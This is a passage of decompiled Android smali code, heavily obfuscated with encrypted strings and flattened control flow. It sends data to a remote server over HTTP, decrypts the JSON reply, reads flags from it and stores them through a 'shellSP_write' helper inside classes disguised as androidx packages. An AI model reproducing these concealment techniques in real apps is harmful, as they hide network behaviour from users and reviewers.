    const-string v2, "\u06ec\u06ec\u06e1\u06dc\u06da\u06da\u06da\u06ec\u06e0\u06e4\u06e1\u06dc\u06dc\u06df\u06eb\u06e7\u06e6\u06d6\u06d8\u06e4\u06d8\u06e7\u06d8\u06e7\u06db\u06e1\u06e8\u06d8\u06e1\u06dc\u06ec\u06d7\u06e8\u06da\u06e0\u06d6\u06e8\u06e5\u06e5\u06e7\u06e6\u06d8\u06e5\u06db\u06e8\u06d8"

    goto/16 :goto_b

    :sswitch_37
    :try_start_c
    const-string v2, "gH4Cg5CjKHXwKTfCUUiSJsd2f9eX4GlvjX0W\n"

    const-string v4, "aMGZZhUGwc4=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "aWUZDQ==\n"

    const-string v10, "AAt/YhOIXBY=\n"

    invoke-static {v4, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    const-string v4, "Ucteww==\n"

    const-string v6, "AYQNl2LwFF8=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v4, 0x2710

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    const/16 v4, 0x2710

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setReadTimeout(I)V

    const/4 v4, 0x1

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const-string v4, "6B0IpimrAIb/Cxa3\n"

    const-string v6, "q3Jm0kzFdKs=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "P5IhZrPsYfY3jT8loqJ39SnPN2Wo4i33LI40ZLngZOc6\n"

    const-string v10, "XuJRCtqPAII=\n"

    invoke-static {v6, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v4, v6}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v4, Ljava/io/BufferedOutputStream;

    invoke-virtual {v2}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v4

    const v8, -0x107da9aa

    const-string v6, "\u06d6\u06e7\u06e5\u06d8\u06d6\u06da\u06d6\u06df\u06db\u06e4\u06df\u06e5\u06e4\u06df\u06e4\u06d7\u06d7\u06d6\u06dc\u06d8\u06d9\u06e7\u06eb\u06db\u06e2\u06d8\u06ec\u06da\u06dc\u06d8\u06dc\u06db\u06e1\u06e8\u06e5\u06d8\u06e5\u06e1\u06d8\u06d6\u06e0\u06db\u06e2\u06d8\u06e8\u06d8\u06df\u06d7\u06eb\u06e7\u06ec\u06dc"

    :goto_18
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b

    move-result v10

    xor-int/2addr v10, v8

    sparse-switch v10, :sswitch_data_f

    goto :goto_18

    :sswitch_38
    :try_start_d
    sget-object v5, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "OrgUc7dQuzxc3R4P\n"

    const-string v10, "3TKilTfRXJw=\n"

    invoke-static {v8, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, "J40rvnkQwdCFRbfUMx+f\n"

    const-string v10, "B6ALVtanJ2E=\n"

    invoke-static {v8, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :goto_19
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_3

    move v5, v4

    goto/16 :goto_c

    :sswitch_39
    :try_start_e
    const-string v6, "\u06e6\u06e7\u06d7\u06d9\u06dc\u06e6\u06d8\u06d7\u06e7\u06e1\u06da\u06e8\u06e6\u06db\u06ec\u06ec\u06e5\u06e4\u06e6\u06e7\u06df\u06d7\u06df\u06d8\u06d8\u06d8\u06e8\u06d6\u06d6\u06d8\u06d9\u06e6\u06d6\u06e5\u06df\u06dc\u06d6\u06db\u06d8\u06d8"

    goto :goto_18

    :sswitch_3a
    const v10, -0x102a40dd

    const-string v6, "\u06dc\u06e7\u06db\u06e2\u06ec\u06dc\u06d8\u06e7\u06db\u06e6\u06d8\u06ec\u06e0\u06d8\u06db\u06dc\u06e8\u06d8\u06ec\u06e2\u06e8\u06e1\u06e1\u06d6\u06d8\u06db\u06e8\u06d8\u06d8\u06d7\u06d8\u06e5\u06d8\u06e0\u06d7\u06e5\u06d8\u06e8\u06e0\u06ec\u06d8\u06db\u06d7\u06e1\u06dc\u06d8\u06db\u06e6\u06db\u06d7\u06e7\u06d9\u06ec\u06e1\u06d8\u06d8\u06da\u06d7\u06d7\u06e4\u06e0\u06d6\u06d8"

    :goto_1a
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_10

    goto :goto_1a

    :sswitch_3b
    const-string v6, "\u06eb\u06e5\u06e6\u06d8\u06e8\u06d8\u06d6\u06d8\u06e4\u06e7\u06e5\u06db\u06df\u06e6\u06d8\u06e5\u06e2\u06df\u06e4\u06e0\u06dc\u06d8\u06dc\u06e2\u06d8\u06d8\u06db\u06d7\u06db\u06db\u06e5\u06d8\u06db\u06d9\u06d8\u06da\u06eb\u06d7\u06e5\u06e5\u06df\u06e4\u06da\u06e8\u06d8\u06d8\u06d9\u06e8\u06d8"

    goto :goto_1a

    :cond_7
    const-string v6, "\u06e4\u06e1\u06e6\u06d8\u06e1\u06d8\u06e5\u06d8\u06eb\u06e1\u06d6\u06e8\u06d6\u06d6\u06e5\u06ec\u06e6\u06d8\u06e2\u06e1\u06e0\u06dc\u06e4\u06df\u06d7\u06e5\u06ec\u06dc\u06e0\u06d6\u06dc\u06dc\u06d8\u06db\u06e6\u06da\u06e8\u06ec\u06e7\u06e2\u06df\u06e6\u06d8\u06e7\u06df\u06df\u06e7\u06d8\u06e5\u06e7\u06e5\u06e6\u06d9\u06d8\u06d9\u06ec\u06d7\u06e6\u06d8"

    goto :goto_1a

    :sswitch_3c
    const/16 v6, 0xc8

    if-ne v4, v6, :cond_7

    const-string v6, "\u06e1\u06e2\u06db\u06e0\u06e5\u06e5\u06d8\u06e2\u06e2\u06d9\u06df\u06ec\u06db\u06e5\u06e4\u06d9\u06e4\u06e7\u06ec\u06e6\u06e0\u06dc\u06db\u06da\u06da\u06d6\u06e8\u06e7\u06e4\u06d9\u06df\u06db\u06db\u06d8\u06db\u06e8"

    goto :goto_1a

    :sswitch_3d
    const-string v6, "\u06d8\u06d7\u06e1\u06d8\u06ec\u06d7\u06e0\u06ec\u06e2\u06e6\u06d8\u06d9\u06e5\u06e0\u06e2\u06e0\u06e1\u06d9\u06d7\u06d7\u06e2\u06df\u06e6\u06d8\u06e1\u06d8\u06d8\u06d8\u06e0\u06d6\u06e2\u06db\u06e6\u06d9\u06e8\u06d6\u06df\u06e7\u06dc\u06e5\u06e2\u06e0\u06e8\u06dc\u06d6\u06d8\u06da\u06e6\u06d8\u06e1\u06df\u06d6\u06d8"
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_b

    goto :goto_18

    :sswitch_3e
    const-string v6, "\u06df\u06d9\u06e1\u06dc\u06dc\u06d7\u06ec\u06d9\u06d6\u06d8\u06d7\u06ec\u06dc\u06d8\u06d6\u06eb\u06d6\u06e8\u06e1\u06e7\u06d8\u06da\u06d8\u06dc\u06ec\u06e8\u06e1\u06d8\u06e6\u06d7\u06d6\u06d7\u06ec\u06df\u06e4\u06e6\u06d8\u06e6\u06e6"

    goto :goto_18

    :sswitch_3f
    :try_start_f
    sget-object v5, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "AgooJH4vR9VkbyJY\n"

    const-string v10, "5YCewv6uoHU=\n"

    invoke-static {v8, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, "2td/x2APAxZ4HPKMKgBd\n"

    const-string v10, "+vpfL8+45ac=\n"

    invoke-static {v8, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v6, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v5, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v6, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :goto_1b
    invoke-virtual {v6}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v8

    const v10, -0x5e9c8d6c

    const-string v5, "\u06d8\u06e1\u06eb\u06d7\u06e8\u06e8\u06d8\u06db\u06d9\u06e1\u06d8\u06e4\u06e4\u06e6\u06ec\u06d7\u06e7\u06e7\u06e5\u06e4\u06e8\u06ec\u06e1\u06d8\u06e5\u06d8\u06e8\u06dc\u06e7\u06e6\u06d6\u06df\u06e7\u06da\u06df\u06d9\u06d6\u06e6\u06d8\u06d7\u06e1\u06e8\u06d8\u06e4\u06e6\u06d8\u06e6\u06dc\u06e7\u06d8\u06da\u06d9\u06e1"

    :goto_1c
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_3

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_11

    goto :goto_1c

    :sswitch_40
    const-string v5, "\u06db\u06e8\u06e4\u06d7\u06db\u06dc\u06d8\u06dc\u06d6\u06eb\u06d7\u06df\u06d6\u06dc\u06e8\u06dc\u06df\u06e2\u06d6\u06e2\u06e8\u06eb\u06dc\u06e6\u06db\u06e0\u06d6\u06d6\u06eb\u06d7\u06eb"

    goto :goto_1c

    :sswitch_41
    :try_start_10
    const-string v5, "\u06ec\u06e1\u06dc\u06d8\u06e0\u06e1\u06e4\u06da\u06e7\u06d8\u06d8\u06d8\u06da\u06d7\u06dc\u06e4\u06e6\u06df\u06e2\u06e6\u06d9\u06d7\u06e7\u06e5\u06e2\u06dc\u06df\u06dc\u06e4\u06e0\u06dc"

    goto :goto_1c

    :sswitch_42
    const v11, 0x5125c818

    const-string v5, "\u06e8\u06e0\u06dc\u06d8\u06eb\u06e5\u06e8\u06d8\u06eb\u06eb\u06db\u06d7\u06e7\u06ec\u06e0\u06d6\u06d8\u06d8\u06e6\u06e2\u06d6\u06df\u06d8\u06e2\u06e5\u06e8\u06d8\u06e6\u06e6\u06db\u06e1\u06eb\u06e5\u06ec\u06d9\u06e2\u06e5\u06e5"

    :goto_1d
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_12

    goto :goto_1d

    :sswitch_43
    const-string v5, "\u06e7\u06e7\u06e5\u06e2\u06e5\u06db\u06d9\u06e8\u06d8\u06d8\u06e6\u06da\u06df\u06d7\u06ec\u06db\u06eb\u06d8\u06eb\u06e1\u06e7\u06d6\u06ec\u06d8\u06e1\u06e0\u06e7\u06e5\u06dc\u06e1\u06e6\u06d9\u06d6\u06e4\u06d8\u06e7\u06d6\u06e4\u06db\u06e6\u06d8\u06e4\u06d9"

    goto :goto_1d

    :cond_8
    const-string v5, "\u06df\u06e7\u06d6\u06d8\u06e2\u06e1\u06e2\u06e4\u06e4\u06e0\u06e6\u06e2\u06e6\u06d8\u06e1\u06e7\u06e5\u06d8\u06e2\u06dc\u06e1\u06dc\u06e1\u06d6\u06ec\u06e2\u06e1\u06d8\u06e8\u06ec\u06da\u06d7\u06db\u06e1\u06d8\u06e5\u06d9\u06e6\u06dc\u06da\u06da\u06d9\u06d6\u06e2\u06e0\u06eb\u06d6\u06d8"

    goto :goto_1d

    :sswitch_44
    if-eqz v8, :cond_8

    const-string v5, "\u06e1\u06df\u06e1\u06e4\u06e7\u06d8\u06e6\u06e5\u06ec\u06e8\u06d9\u06e2\u06d9\u06e5\u06d8\u06e1\u06d6\u06e1\u06d8\u06d6\u06e0\u06d9\u06d6\u06e2\u06d7\u06e6\u06e6\u06da\u06d6\u06eb\u06db\u06d8\u06d6\u06e1\u06e8\u06e6"

    goto :goto_1d

    :sswitch_45
    const-string v5, "\u06d9\u06eb\u06d6\u06e1\u06da\u06d8\u06e6\u06e6\u06d7\u06e2\u06d9\u06e0\u06e8\u06d7\u06e5\u06d7\u06e1\u06d8\u06e5\u06e1\u06e6\u06d8\u06e2\u06e4\u06e6\u06d8\u06ec\u06e7\u06e7\u06eb\u06e2\u06eb\u06e5\u06ec\u06e1\u06d8\u06d6\u06e8\u06e7\u06d8"

    goto :goto_1c

    :sswitch_46
    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_3

    goto :goto_1b

    :catch_3
    move-exception v2

    move v5, v4

    :goto_1e
    :try_start_11
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "TFbQRuz1pfoSC/ksp+3PsB1VpxLY\n"

    const-string v8, "pe1IrkJRTVU=\n"

    invoke-static {v6, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "xfu5yhgt58KRsZOKdCGjgLXp\n"

    const-string v6, "IFknL5KNAmY=\n"

    invoke-static {v2, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "VogY0L4=\n"

    const-string v6, "M/pqv8yWs9Y=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_4

    goto/16 :goto_c

    :catch_4
    move-exception v2

    :goto_1f
    const/4 v4, 0x0

    const/4 v5, 0x0

    aget v5, p4, v5

    add-int/lit8 v5, v5, 0x1

    aput v5, p4, v4

    const-string v4, "fxSODoojjM8bbZxR+jrz\n"

    const-string v5, "mYgk6RWGaXM=\n"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v4, v5, v6, v2}, Landroidx/base/남자;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "ugk7sVU=\n"

    const-string v5, "33tJ3ieU/DU=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    move-object v2, v3

    :goto_20
    const v4, 0x1e7c06ed

    const-string v3, "\u06e0\u06eb\u06d9\u06e8\u06e1\u06e7\u06d8\u06e1\u06d9\u06d6\u06d8\u06e5\u06dc\u06d8\u06e4\u06d9\u06e6\u06d8\u06e8\u06e0\u06e5\u06d7\u06d8\u06d8\u06da\u06e0\u06e8\u06d8\u06eb\u06d8\u06e8\u06d7\u06ec\u06e8\u06d8\u06e0\u06e7\u06dc\u06d8\u06e5\u06d6\u06d6\u06d9\u06d6\u06d9\u06dc\u06d8\u06e6\u06e7\u06e8\u06e4\u06e8\u06ec\u06d6\u06e5\u06e8\u06e5\u06dc\u06e4\u06eb"

    :goto_21
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_13

    goto :goto_21

    :sswitch_47
    const v5, -0x7591a46f

    const-string v3, "\u06df\u06e8\u06e8\u06d8\u06d6\u06e2\u06ec\u06e4\u06e1\u06e6\u06da\u06e8\u06e7\u06d8\u06e0\u06db\u06e6\u06d8\u06db\u06d8\u06d8\u06d8\u06d9\u06e5\u06d6\u06d6\u06e6\u06e7\u06e2\u06e6\u06e1\u06e0\u06df\u06d7\u06d8\u06e7\u06d9\u06eb\u06e1\u06d8\u06eb\u06eb\u06dc\u06ec\u06d7\u06d7\u06e7\u06da\u06e2\u06db\u06df\u06e6"

    :goto_22
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_14

    goto :goto_22

    :sswitch_48
    const-string v3, "\u06ec\u06d6\u06eb\u06da\u06e0\u06e0\u06e1\u06e7\u06e5\u06e1\u06ec\u06e5\u06e1\u06d6\u06d7\u06e5\u06ec\u06e1\u06d8\u06dc\u06e8\u06e8\u06d8\u06e5\u06d7\u06d7\u06db\u06e2\u06e2\u06e6\u06e8\u06db\u06d9\u06eb\u06df\u06e8\u06e8\u06e5\u06d8\u06d6\u06da\u06d6\u06d9\u06e8\u06e1\u06eb\u06d8\u06e6\u06d9\u06e8\u06eb"

    goto :goto_21

    :sswitch_49
    :try_start_12
    invoke-virtual {v6}, Ljava/io/BufferedReader;->close()V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_3

    goto/16 :goto_19

    :sswitch_4a
    const-string v2, "\u06e1\u06d8\u06d6\u06d8\u06d7\u06dc\u06db\u06ec\u06e1\u06ec\u06e0\u06e7\u06e8\u06db\u06e2\u06e1\u06d8\u06dc\u06d8\u06df\u06e2\u06e5\u06d8\u06d7\u06ec\u06dc\u06e7\u06ec\u06da\u06dc\u06e7\u06ec\u06d8\u06eb\u06e6\u06e2\u06d7\u06e6\u06d8\u06e4\u06d7\u06e8\u06d6\u06e8\u06df\u06d9\u06e4\u06d8\u06eb\u06ec\u06ec\u06db\u06d7\u06dc\u06d8\u06da\u06d8\u06d9"

    goto/16 :goto_d

    :sswitch_4b
    const v6, 0x520cbef9

    const-string v2, "\u06d6\u06e6\u06e0\u06e8\u06dc\u06d9\u06e5\u06dc\u06e8\u06d7\u06e5\u06e8\u06d8\u06e6\u06e0\u06e5\u06d8\u06e4\u06e1\u06eb\u06d9\u06d7\u06d7\u06ec\u06e2\u06df\u06e6\u06e6\u06e5\u06e7\u06ec\u06e1\u06d8\u06e5\u06d6\u06e8\u06d8\u06df\u06e8\u06d6\u06d8"

    :goto_23
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v6

    sparse-switch v8, :sswitch_data_15

    goto :goto_23

    :sswitch_4c
    const-string v2, "\u06db\u06e4\u06db\u06e5\u06e1\u06ec\u06dc\u06e2\u06e4\u06d8\u06e0\u06df\u06e0\u06e4\u06e8\u06e1\u06e1\u06e5\u06e1\u06d8\u06d8\u06e0\u06ec\u06e2\u06e0\u06e6\u06d6\u06d8\u06ec\u06e8\u06d8\u06d8\u06d7\u06dc\u06e8\u06d8\u06e2\u06d9\u06d7\u06d7\u06d6\u06e2\u06dc\u06d7\u06e8\u06d8\u06d6\u06e8\u06d9"

    goto/16 :goto_d

    :cond_9
    const-string v2, "\u06e0\u06da\u06e0\u06e7\u06ec\u06d9\u06eb\u06e0\u06d6\u06e8\u06e4\u06d6\u06e4\u06e7\u06df\u06d8\u06e2\u06e2\u06d6\u06da\u06e4\u06d7\u06e5\u06e7\u06d8\u06e1\u06e1\u06ec\u06dc\u06e1\u06e1\u06dc\u06df\u06e6\u06d6\u06d8\u06dc\u06d8\u06d6\u06da\u06d8\u06d8\u06e0\u06db\u06e6\u06e6\u06e4\u06d7\u06d6\u06e4"

    goto :goto_23

    :sswitch_4d
    const/16 v2, 0xc8

    if-ne v5, v2, :cond_9

    const-string v2, "\u06d6\u06e2\u06eb\u06e5\u06e7\u06e6\u06d8\u06e6\u06df\u06dc\u06db\u06df\u06d8\u06e1\u06e4\u06e6\u06d8\u06da\u06da\u06e8\u06e4\u06d9\u06eb\u06dc\u06e6\u06e6\u06e0\u06dc\u06e1\u06e6\u06da\u06e7\u06da\u06d6\u06eb\u06e8\u06d8\u06dc\u06d8\u06d8\u06d6\u06dc\u06e6\u06d7\u06e6\u06d8\u06da\u06d7\u06e6\u06d8\u06e4\u06ec\u06e2"

    goto :goto_23

    :sswitch_4e
    const-string v2, "\u06d6\u06e6\u06eb\u06e8\u06e5\u06e7\u06e4\u06e6\u06d8\u06eb\u06da\u06d7\u06e0\u06e2\u06e5\u06d8\u06d8\u06e4\u06e8\u06d8\u06e4\u06dc\u06e8\u06d8\u06e7\u06e8\u06eb\u06d9\u06df\u06ec\u06e2\u06dc\u06d9\u06e8\u06e8\u06eb\u06eb\u06e0\u06e8\u06d8\u06d6\u06e1\u06df\u06e8\u06e7\u06da\u06db\u06d6\u06d6\u06db\u06e4\u06dc\u06d8\u06e2\u06ec\u06d9\u06e1\u06e0\u06dc\u06d8"

    goto :goto_23

    :sswitch_4f
    :try_start_13
    const-string v2, "F8zV5LJPDl9vhuidI66Hs5peUDIz\n"

    const-string v4, "/2NiAgPN6Nc=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "lsk=\n"

    const-string v5, "+aJIzVnc5BM=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "mV1xcw0NxDqRXyMlW1+WZA==\n"

    const-string v5, "qG9CRzg78wI=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/저장;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v2, "l1Z3vMoaFg==\n"

    const-string v4, "+DAR0KN0c4o=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const v5, 0x5d274262

    const-string v2, "\u06e5\u06e0\u06dc\u06d8\u06dc\u06d6\u06e7\u06d8\u06df\u06e6\u06e8\u06dc\u06e0\u06eb\u06e6\u06e1\u06e4\u06e7\u06e4\u06d7\u06e0\u06eb\u06e6\u06ec\u06e8\u06e8\u06d9\u06df\u06d8\u06d8\u06db\u06d6\u06e7\u06d8\u06eb\u06e6\u06d6\u06d7\u06ec\u06e1\u06e1\u06dc\u06e0\u06d9\u06d6\u06eb"

    :goto_24
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_5

    move-result v8

    xor-int/2addr v8, v5

    sparse-switch v8, :sswitch_data_16

    goto :goto_24

    :sswitch_50
    :try_start_14
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v4, "1sq7Pu4Defuzg7Z1tCscmLb0\n"

    const-string v5, "PmQL21GFkH4=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v2, "sCXWH2j8\n"

    const-string v4, "00q4eQGb638=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p3

    invoke-static {v0, v2, v4}, LKvrUY/RiiGL/Utils;->shellSP_write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_4

    :goto_25
    :try_start_15
    const-string v2, "G73i0l4hxg==\n"

    const-string v4, "f9SRszxNo8s=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const v5, -0x1e95b795

    const-string v2, "\u06da\u06e1\u06e6\u06d8\u06e8\u06df\u06eb\u06d6\u06e2\u06e4\u06e0\u06d9\u06ec\u06e2\u06e8\u06d8\u06d6\u06d8\u06d6\u06d7\u06d6\u06d7\u06d9\u06e2\u06eb\u06d8\u06df\u06db\u06df\u06e7\u06eb\u06da\u06ec\u06d9\u06e4\u06d8\u06e5\u06d8\u06e0\u06e8\u06e2\u06e5\u06e2\u06e2\u06e5\u06df\u06e1\u06d7\u06da\u06d7\u06e6\u06e2\u06e7\u06e1\u06dc"

    :goto_26
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v5

    sparse-switch v8, :sswitch_data_17

    goto :goto_26

    :sswitch_51
    const-string v2, "8ontcEdkknfzju10SQ==\n"

    const-string v4, "kOWMEyw74hY=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const-string v2, "QCrVonObydFFENKccpzJ1UsQzpRigw==\n"

    const-string v5, "Lk+i/RH3qLI=\n"

